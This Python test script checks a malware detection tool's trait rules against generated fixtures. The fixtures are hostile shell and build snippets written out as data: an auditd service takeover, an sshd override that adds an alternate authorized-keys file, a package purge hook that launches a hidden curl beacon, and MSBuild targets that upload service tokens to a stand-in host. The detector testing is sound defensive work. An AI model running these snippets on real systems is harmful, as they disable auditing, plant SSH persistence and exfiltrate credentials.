#!/usr/bin/env python3
"""Check reviewed fixture bytes and behavioral validation regressions offline."""
import hashlib
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
CLEAVE = str(Path(os.environ.get('CLEAVE', ROOT.parent / 'cleave/target/release/cleave')).resolve())
LIKE = 'objectives/impact/ui/manipulation/social/clickjacking::coordinate-bound-like-frame-trap'
CONSTRUCTED = 'micro-behaviors/ui/controls/widget::constructed-like-iframe-coordinate-position'
MARKUP = 'micro-behaviors/ui/controls/widget::markup-like-iframe-coordinate-position'
AUDIT = 'objectives/evasion/security-bypass/disable-service::shell-replaces-auditd-command'
SSH = 'objectives/persistence/login/ssh-authorized-keys::sshd-service-alternate-key-override'
PURGE = 'objectives/persistence/system/package-manager::purge-hook-leaves-hidden-callback'
UPLOAD = 'micro-behaviors/communications/http/request/credentials/unspecified-origin::msbuild-stdin-token-upload-'


def main():
    with tempfile.TemporaryDirectory(prefix='validation-repairs-') as temp:
        work = Path(temp)
        cases = []

        def case(name, content, required=(), forbidden=(), maximum=None):
            path = work / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content)
            cases.append((name, path, set(required), set(forbidden), maximum))

        review = json.loads((ROOT/'docs/triage/validation-fixture-review-2026-11-02.json').read_text())
        for fixture in review['fixtures']:
            path = ROOT/fixture['to']
            assert hashlib.sha256(path.read_bytes()).hexdigest() == fixture['sha256'], path
            assert not (ROOT/fixture['from']).exists(), fixture['from']
            maximum = 3 if '/notable/' in fixture['to'] else 4
            cases.append((path.name, path, set(), set(), maximum))

        for path in [ROOT/'testdata/hostile/generated/triage-html-decoders/pointer-visible.html',
                     ROOT/'testdata/hostile/samples/mousemove-like-iframe-teardown.html',
                     ROOT/'testdata/hostile/samples/self-removing-like-follower.html']:
            cases.append((path.name, path, {LIKE}, set(), 5))
        original = (ROOT/'testdata/hostile/samples/self-removing-like-follower.html').read_text()
        case('pointer/renamed.html', original.replace('like', 'social').replace('/social.php', '/like.php').replace('var x =', 'var horizontal =').replace('(x -', '(horizontal -').replace('if (x < 0) x = 0;', 'if (horizontal < 0) horizontal = 0;'), [LIKE, CONSTRUCTED], maximum=5)
        for name, content in {
            'other-positioned-node': original.replace('like.style.top', 'tooltip.style.top').replace('like.style.left', 'tooltip.style.left'),
            'other-top-node': original.replace('like.style.top', 'tooltip.style.top'),
            'other-source-node': original.replace('like.src', 'other.src'),
            'other-source': original.replace('www.facebook.com/plugins/like.php', 'www.example.test/widget'),
            'unbound-x': original.replace('(x - 0)', '(other - 0)'),
            'unbound-y': original.replace('(y - 0)', '(other - 0)'),
        }.items():
            case('pointer/'+name+'.html', content, forbidden=[LIKE, CONSTRUCTED])
        alias = (ROOT/'testdata/hostile/samples/mousemove-like-iframe-teardown.html').read_text()
        case('pointer/alias-renamed.html', alias.replace('vert', 'position').replace('theiframe', 'socialframe').replace('my', 'vertical').replace('mx', 'horizontal'), [LIKE, MARKUP], maximum=5)
        case('pointer/alias-other-id.html', alias.replace('getElementById("theiframe").style', 'getElementById("tooltip").style'), forbidden=[LIKE, MARKUP])
        case('pointer/alias-other-receiver.html', alias.replace('vert.left', 'other.left'), forbidden=[LIKE, MARKUP])
        case('pointer/alias-other-source.html', alias.replace('www.facebook.com/widgets/like.php', 'www.example.test/widget'), forbidden=[LIKE, MARKUP])

        audit = "#!/bin/sh\nprintf '[Service]\\nExecStart=\\nExecStart=/bin/sh -c \"exec /usr/lib/example/worker\"\\n' > /etc/systemd/system/auditd.service.d/override.conf\n"
        case('audit/takeover.sh', audit, [AUDIT], maximum=5)
        case('audit/ordinary-service.sh', audit.replace('auditd.service', 'example.service'), forbidden=[AUDIT])
        case('audit/real-auditd.sh', audit.replace('/usr/lib/example/worker', '/sbin/auditd'), forbidden=[AUDIT])
        case('audit/no-override.sh', audit.replace('> /etc/systemd/system/auditd.service.d/override.conf', '> /tmp/preview.conf'), forbidden=[AUDIT])
        case('audit/quoted.sh', "#!/bin/sh\ncat <<'DOC'\n"+audit+'DOC\n', forbidden=[AUDIT])
        ssh = "#!/bin/sh\nprintf '[Service]\\nExecStart=\\nExecStart=/usr/sbin/sshd -D -o AuthorizedKeysFile=/var/lib/example/keys\\n' > /etc/systemd/system/sshd.service.d/override.conf\n"
        case('ssh/override.sh', ssh, [SSH])
        case('ssh/ordinary-service.sh', ssh.replace('sshd.service', 'example.service'), forbidden=[SSH])
        case('ssh/no-override.sh', ssh.replace('> /etc/systemd/system/sshd.service.d/override.conf', '> /tmp/preview.conf'), forbidden=[SSH])

        purge = "#!/bin/sh\nif [ \"$1\" = purge ] && [ -e /tmp/enrolled ]; then\n  printf '#!/bin/sh\\nwhile true; do curl -fsSL https://example.test/pulse >/dev/null 2>&1; sleep 600; done\\n' > /var/lib/example/.callback\n  nohup /var/lib/example/.callback >/dev/null 2>&1 &\nfi\n"
        case('purge/live/control/postrm', purge, [PURGE], maximum=5)
        case('purge/different-launch/control/postrm', purge.replace('nohup /var/lib/example/.callback', 'nohup /var/lib/example/.other'), forbidden=[PURGE])
        case('purge/ordinary-hook/control/postrm', purge.replace('= purge', '= configure'), forbidden=[PURGE])
        case('purge/quoted/control/postrm', "#!/bin/sh\ncat <<'DOC'\n"+purge+'DOC\n', forbidden=[PURGE])

        body = "curl -fsSL --data-binary @- https://example.test/metrics &lt;&lt;'BODY'\n$(Service_TOKENS)\nBODY"
        for number, targets, execs in [(1, 1, 1), (2, 2, 1), (3, 1, 2), (4, 2, 2)]:
            exec_tag = '<Exec Command="'+body+'" />'
            target = '<Target AfterTargets="Restore">'+exec_tag*execs+'</Target>'
            case(f'msbuild/array-{number}.targets', '<Project>'+target*targets+'</Project>', [UPLOAD+str(number)], maximum=4)
        for name, value in {'ordinary-property': body.replace('Service_TOKENS', 'Configuration'),
                            'no-upload': body.replace('--data-binary @-', ''),
                            'no-stdin-body': body.replace('&lt;&lt;', '&gt;'),
                            'no-network': body.replace('https://example.test/metrics', 'file:///tmp/data')}.items():
            case('msbuild/'+name+'.targets', '<Project><Target><Exec Command="'+value+'"/></Target></Project>', forbidden=[UPLOAD+str(i) for i in range(1,5)])
        case('frame/hidden.html', '<html><head></head><body><iframe src="http://example.test/12345.html" width=1 height=1></iframe></body></html>', forbidden=['objectives/execution/exploit/chain/browser::loader-shell-pixel-frame-injector'])

        env = os.environ.copy()
        env.update(XDG_CACHE_HOME=str(work/'cache'), RAYON_NUM_THREADS='4')
        result = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), '--format', 'json', *[str(c[1]) for c in cases]], cwd=ROOT, capture_output=True, text=True, env=env, timeout=600)
        if result.returncode:
            raise SystemExit(result.stderr[-5000:])
        reports = {}
        for line in result.stdout.split('\n'):
            if line.strip():
                report = json.loads(line)
                reports[str(Path(report['files'][0]['path']).resolve())] = report
        for name, path, required, forbidden, maximum in cases:
            report = reports[str(path.resolve())]
            traits = {t['id']: t['crit'] for f in report['files'] for t in f.get('traits', [])}
            assert required <= traits.keys(), (name, 'missing', required-traits.keys())
            assert not forbidden & traits.keys(), (name, 'unexpected', forbidden & traits.keys())
            if maximum is not None:
                assert max(traits.values(), default=0) == maximum, (name, 'criticality', max(traits.values(), default=0), maximum)
            print(name+': ok', flush=True)
        print(f'{len(cases)} validation-repair checks passed', flush=True)


if __name__ == '__main__':
    main()
